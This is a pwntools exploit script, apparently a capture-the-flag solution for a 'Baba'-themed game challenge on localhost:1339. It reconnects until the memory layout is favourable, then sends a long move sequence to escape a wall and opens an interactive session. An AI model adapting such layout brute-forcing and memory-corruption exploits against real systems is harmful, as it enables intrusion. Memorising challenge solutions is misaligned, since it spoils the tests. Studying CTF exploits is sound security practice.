import pwn
import time
# aslr (baba's addr on stack) 
# must be in favor to teleport outside wall
i = 0
while(i < 30):
    p = pwn.remote("localhost", 1339)
    time.sleep(1)
    s = p.recv(40000)
    if (s[0x848:0x84a]==" a"):
        break
    p.close()
    i+=1
moves = "ddddddddddddssssssdassdwwwwwwwwwwwwwddddddsswwwwaaaaasadwawaasdssssssasdwdssswwwwwwwwawwdsddddasdssaaawsddddwwaaaddddddsssssdddddwwasdsaaaaaaaaaasawwwwwsdwssssddddddddddsaaaaaaaasawwwwwwddddsssssddddsaasawwwwwwwdwaaaasddddssssddwaawassssasddddwdssssswwwwwwwaaaaaaaaawwdwwwsssaaaawaassasddddddddddwdssssssasddddwdsswwwwwwaaaaawwwwwwwwwaaassddsssssdddddssdsssssssadwwwwwwwaaaaaaawaaawawwwwsddwassssssssdswwddsadsaswddwaawwwwwwaaaaaaaaawwwwwwwwwddddddwaaaaaawassssssssssssssssssdsawasdddddddssssssssssssssssssssssssssssssdddddddddddddddddddddddddddddwwwwwwwwwwwwwwwwwwwwdwwwwwwwwwwawwaaaaaaaaaaaaaaaaaaddddddddddddddddddddssssssssssssssssssssssa"
moves += "aaaaaaawaaasaaaaaaaaaaaswaassswwwassswwwasssddddddddddddddddwdddwwwaaaasdddddsdwwwwwwwwwwwwwwwwwdwwaasdwdsaaaaaaasssssaaaaaaaaaaasddwdssssssssssss"
moves += "wwwwdddddddsssdsaaaaaawas"
moves += "wwwwwwwwwwwwwwwwwaaaaaaaawaaasssssssssssssssssasddddddddddddwdsaaaaaaaaaaass"
moves += "dwawdddddddddddwdsaaaaaaaaaaaawwwwwwwwdsssssssasddddddddddddwdswwwwwddddwaawasssssssdswddddddddwwwwwwwwdssssssdsawasddsaaaaaaaaaaaaaaaaaaaawaswasasssddddw"
p.sendline(moves)
p.interactive()